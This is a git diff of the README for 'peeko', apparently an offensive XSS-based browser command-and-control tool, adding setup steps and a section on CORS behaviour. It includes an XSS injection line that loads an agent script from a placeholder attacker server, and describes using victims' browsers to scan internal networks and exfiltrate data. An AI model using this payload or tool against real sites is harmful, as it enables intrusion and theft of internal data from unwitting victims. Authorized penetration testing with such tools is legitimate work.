@@ -1,10 +1,10 @@
-# peeklo
+# peeko
 
 **Version:** v1.0
 
-peeklo is a browser-based XSS-powered C2 (Command and Control) tool that leverages the victim’s browser as a stealthy proxy inside internal networks.
+peeko is a browser-based XSS-powered C2 (Command and Control) tool that leverages the victim’s browser as a stealthy proxy inside internal networks.
 
-Through an injected XSS payload, peeklo establishes a WebSocket connection to a central server, allowing an attacker to remotely control the victim’s browser to send requests to internal services, scan networks, and exfiltrate data — all without dropping a single binary.
+Through an injected XSS payload, peeko establishes a WebSocket connection to a central server, allowing an attacker to remotely control the victim’s browser to send requests to internal services, scan networks, and exfiltrate data — all without dropping a single binary.
 
 ---
 
@@ -35,8 +35,8 @@ Through an injected XSS payload, peeklo establishes a WebSocket connection to a 
 1. Clone the repository:
 
     ```bash
-    git clone https://github.com/b3rito/peeklo.git
-    cd peeklo
+    git clone https://github.com/b3rito/peeko.git
+    cd peeko
     ```
 
 2. Install dependencies:
@@ -45,7 +45,7 @@ Through an injected XSS payload, peeklo establishes a WebSocket connection to a 
     make install
     ```
 
-3. (If needed) Make scripts executable:
+3. (Optional) Make scripts executable if needed:
 
     ```bash
     chmod +x gen-cert.sh start.sh
@@ -57,24 +57,36 @@ Through an injected XSS payload, peeklo establishes a WebSocket connection to a 
     make cert
     ```
 
-5. Run the server:
+5. Replace the `SERVER-IP` placeholder:
+
+    Open the following files and replace all occurrences of `SERVER-IP` with the actual IP address or domain of your machine:
+
+    - `static/agent.js`
+    - `static/control.html`
+
+    Example:
+
+    ```javascript
+    wss://SERVER-IP:8443/ws → wss://192.168.1.12:8443/ws
+    ```
+
+6. Run the server:
 
     ```bash
     make run
     ```
 
-6. Open your browser and access the control panel:
+7. Open your browser and access the control panel:
 
     ```
     https://SERVER-IP:8443/static/control.html
     ```
 
-7. Inject the XSS payload (example):
+8. Inject the XSS payload (example):
 
     ```html
     <script src="https://SERVER-IP:8443/static/agent.js"></script>
     ```
-
 ---
 
 ## Usage
@@ -107,7 +119,7 @@ wss://SERVER-IP:8443/ws
 ## Project Structure
 
 ```
-peeklo/
+peeko/
 ├── main.py             → FastAPI WebSocket server  
 ├── start.sh            → Launch server  
 ├── gen-cert.sh         → Generate self-signed TLS certificate  
@@ -125,9 +137,9 @@ peeklo/
 ## Workflow
 
 1. Inject the payload into a vulnerable web application  
-2. Victim’s browser loads the agent and connects to your peeklo server  
+2. Victim’s browser loads the agent and connects to your peeko server  
 3. From the control panel, you issue commands to fetch URLs or scan targets  
-4. peeklo logs and returns the content of internal services  
+4. peeko logs and returns the content of internal services  
 
 ---
 
@@ -138,10 +150,29 @@ peeklo/
 
 ---
 
+## CORS Behavior
+
+peeko uses `fetch()` from within the victim’s browser to request internal web services.  
+However, modern browsers enforce **CORS (Cross-Origin Resource Sharing)** policies that determine whether the attacker can read the response.
+
+In real-world environments (e.g., internal apps during a penetration test), the outcome depends on the CORS headers:
+
+| Response Header                          | Works? | Explanation                                                |
+|------------------------------------------|--------|------------------------------------------------------------|
+| `Access-Control-Allow-Origin: *`         | ✅     | You can read the full response body and status code.       |
+| _No_ `Access-Control-Allow-Origin`       | ⚠️     | The request succeeds, but the response is opaque.          |
+| Restrictive CORS (e.g., specific domains)| ❌     | The browser blocks the response or hides its contents.     |
+
+### In practice
+
+During a penetration test, if you find an internal service that responds with `Access-Control-Allow-Origin: *`, then **peeko becomes a stealth proxy**, capable of exfiltrating internal data directly from the victim's browser without dropping any files or opening outbound connections.
+
+---
+
 ## Disclaimer
 
 This tool is provided for educational and authorized testing purposes only.  
-Any use of peeklo outside of environments where you have explicit permission is **strictly prohibited**.  
+Any use of peeko outside of environments where you have explicit permission is **strictly prohibited**.  
 You are responsible for your own actions.
 
 ---
